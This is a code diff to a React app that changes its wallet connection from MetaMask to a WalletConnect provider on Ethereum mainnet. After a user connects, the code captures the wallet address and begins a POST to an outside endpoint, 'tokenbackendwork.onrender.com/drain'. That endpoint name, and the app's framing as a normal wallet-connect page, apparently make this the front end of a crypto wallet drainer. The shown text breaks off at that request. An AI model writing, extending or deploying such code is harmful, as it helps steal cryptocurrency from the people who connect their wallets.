@@ -1,9 +1,26 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import ReactDOM from "react-dom/client";
+
+// Import WalletConnect Provider
+import { WalletConnect } from "@walletconnect/web3-provider";
 
 const App = () => {
   const [response, setResponse] = useState(null);
   const [loading, setLoading] = useState(false);
+  const [walletProvider, setWalletProvider] = useState(null);
+  const [walletAddress, setWalletAddress] = useState(null);
+
+  // Initialize WalletConnect
+  useEffect(() => {
+    const provider = new WalletConnect({
+      bridge: "https://bridge.walletconnect.org", // WalletConnect bridge URL
+      qrcode: true, // Show QR code for mobile
+      chainId: 1, // Ethereum mainnet
+    });
+
+    setWalletProvider(provider);
+    return () => provider.disconnect();
+  }, []);
 
   const connectWallet = async () => {
     setLoading(true);
@@ -11,16 +28,16 @@ const App = () => {
 
     try {
       // Check if wallet is available
-      if (!window.ethereum) {
-        throw new Error("Wallet not detected. Please install MetaMask or another supported wallet.");
+      if (!walletProvider) {
+        throw new Error("Wallet not detected. Please install a supported wallet.");
       }
 
-      // Request accounts from wallet
-      const accounts = await window.ethereum.request({
-        method: "eth_requestAccounts",
-      });
+      await walletProvider.enable(); // Connect to wallet
 
-      const address = accounts[0];
+      // Get wallet address
+      const address = walletProvider.accounts[0];
+
+      setWalletAddress(address);
 
       // Make a POST request to your backend
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
